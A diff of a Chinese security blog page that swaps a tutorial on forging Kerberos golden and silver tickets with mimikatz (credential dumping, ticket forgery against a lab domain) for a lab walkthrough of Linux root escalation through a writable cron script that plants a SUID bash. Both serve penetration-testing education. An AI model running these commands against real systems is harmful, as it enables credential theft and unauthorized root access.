@@ -17,7 +17,7 @@
   <meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚">
   <meta name="author" content="iceH">
   <meta name="keywords" content="">
-  <title>Kerberos协议之黄金票据和白银票据 - iceH’s Blog</title>
+  <title>Linux提权之定时任务 - iceH’s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Kerberos协议之黄金票据和白银票据">
+            <span class="h2" id="subtitle" title="Linux提权之定时任务">
               
             </span>
 
@@ -206,8 +206,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-11-25 11:42" pubdate>
-        2020年11月25日 中午
+      <time datetime="2020-11-26 15:40" pubdate>
+        2020年11月26日 下午
       </time>
     </span>
   
@@ -218,7 +218,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      843 字
+      676 字
     </span>
   
 
@@ -228,7 +228,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      8
        分钟
     </span>
   
@@ -258,64 +258,73 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Kerberos协议之黄金票据和白银票据</h1>
+            <h1 style="display: none">Linux提权之定时任务</h1>
             
             <div class="markdown-body">
-              <h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h2><p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p>
-<p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</p>
-<h3 id="制作黄金票据的前提条件"><a href="#制作黄金票据的前提条件" class="headerlink" title="制作黄金票据的前提条件"></a>制作黄金票据的前提条件</h3><ul>
-<li>1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f</li>
-<li>2、域名称    secice.cn</li>
-<li>3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595</li>
-<li>4、要伪造的用户名(可以是任意用户甚至是不存在的用户)</li>
-</ul>
-<h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：</p>
-<pre><code class="hljs awk">mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:secice.cn /user:krbtgt	//导出 krbtgt 密码 hash</span>
-也可以
-mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:secice.cn /user:krbtgt&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt	<span class="hljs-regexp">//</span>将导出的信息保存在<span class="hljs-number">1</span>.txt中</code></pre>
+              <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" srcset="/img/loading.gif" alt="Linux提权之定时任务"></p>
+<p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p>
+<pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre>
 
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/01.png" srcset="/img/loading.gif" alt="黄金票据利用"></p>
-<p>切换到普通域用户的机器，生成TGT凭证,用户名随意:</p>
-<pre><code class="hljs awk">mimikatz <span class="hljs-comment"># kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt</span>
-也可以
-mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&quot;</span> <span class="hljs-string">&quot;kerberos::list&quot;</span> <span class="hljs-keyword">exit</span></code></pre>
-
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/02.png" srcset="/img/loading.gif" alt="黄金票据利用"></p>
-<blockquote>
-<p>注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。</p>
-</blockquote>
-<h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h2><p>白银票据是出现在TGS_REQ &amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。</p>
-<h3 id="伪造白银票据的前提条件"><a href="#伪造白银票据的前提条件" class="headerlink" title="伪造白银票据的前提条件"></a>伪造白银票据的前提条件</h3><ul>
-<li>1、域名称        secice.cn</li>
-<li>2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595</li>
-<li>3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a</li>
-<li>4、伪造的用户名(可以是任意的)</li>
-</ul>
-<p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.</p>
-<h3 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h3><p>首先登录域控，dump机器hash</p>
-<pre><code class="hljs awk">privilege::debug
-
-sekurlsa::logonpasswords
-
-也可以
-
-mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt</code></pre>
-
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/03.png" srcset="/img/loading.gif" alt="白银票据利用"></p>
-<p>将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）</p>
-<pre><code class="hljs awk">mimikatz.exe privilege::debug <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&quot;</span> <span class="hljs-keyword">exit</span></code></pre>
-
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/04.png" srcset="/img/loading.gif" alt="白银票据利用"></p>
-<p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/05.png" srcset="/img/loading.gif" alt="白银票据利用"></p>
-<p>不仅仅是cifs服务还有其他：</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/06.png" srcset="/img/loading.gif" alt="白银票据利用"></p>
-<p>ldap可以用来dcsync</p>
-<h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><ol>
-<li>访问权限不同<br>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</li>
-<li>加密方式不同<br>Golden Ticket 由 krbtgt 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</li>
-<li>认证流程不同<br>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</li>
+<p>如果未正确配置Cron，则可以利用它获得root特权。</p>
+<ol>
+<li>cron作业中是否有可写的脚本或二进制文件？</li>
+<li>我们可以覆盖cron文件本身吗？</li>
+<li>cron.d目录可写吗？</li>
 </ol>
+<p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p>
+<pre><code class="hljs bash">mkdir cleanup
+<span class="hljs-built_in">cd</span> cleanup
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.php
+ls</code></pre>
+
+<p>下图是上面命令执行的结果：</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" srcset="/img/loading.gif" alt="创建文件"></p>
+<p>下面我们写一个python程序来删除 /home/cleanup的内容。</p>
+<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp
+vi cleanup.py</code></pre>
+
+<pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>
+import os
+import sys
+try:
+   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)
+except:
+    sys.exit()</code></pre>
+
+<p><code>chmod 777 cleanup.py</code></p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" srcset="/img/loading.gif" alt="创建文件"></p>
+<p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p>
+<pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab
+*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre>
+
+<p>下面是运行效果</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" srcset="/img/loading.gif" alt="创建文件"></p>
+<p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p>
+<p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p>
+<p>该工具的下载地址：</p>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre>
+
+<p>首先将pspy上传到目标机器：</p>
+<p>1）chmod +x pspy64s</p>
+<p>2）./pspy64</p>
+<p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" srcset="/img/loading.gif" alt="pspy64s"></p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" srcset="/img/loading.gif" alt="pspy64s"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" srcset="/img/loading.gif" alt="查看权限"></p>
+<p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p>
+<pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre>
+
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" srcset="/img/loading.gif" alt="修改文件"></p>
+<p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" srcset="/img/loading.gif" alt="利用成功"></p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" srcset="/img/loading.gif" alt="root权限"></p>
+<p>提权成功。</p>
 
             </div>
             <hr>
@@ -333,14 +342,14 @@ mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+                      <a class="hover-with-bg" href="/tags/%E6%8F%90%E6%9D%83/">提权</a>
                     
                   </div>
                 
               </div>
               <p class="note note-warning">
               <strong>本文作者: </strong><a href="/">iceH</a> <br>
-              <strong>本文链接: </strong><a href="http://www.secice.cn/post/737303c7">http://www.secice.cn/post/737303c7</a> <br>
+              <strong>本文链接: </strong><a href="http://www.secice.cn/post/undefined">http://www.secice.cn/post/undefined</a> <br>
               <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  </p>
                  
@@ -349,18 +358,12 @@ mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/post/undefined">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Linux提权之定时任务</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/post/fe98a932">
-                        <span class="hidden-mobile">域渗透之Kerberos协议</span>
+                      <a href="/post/737303c7">
+                        <span class="hidden-mobile">Kerberos协议之黄金票据和白银票据</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
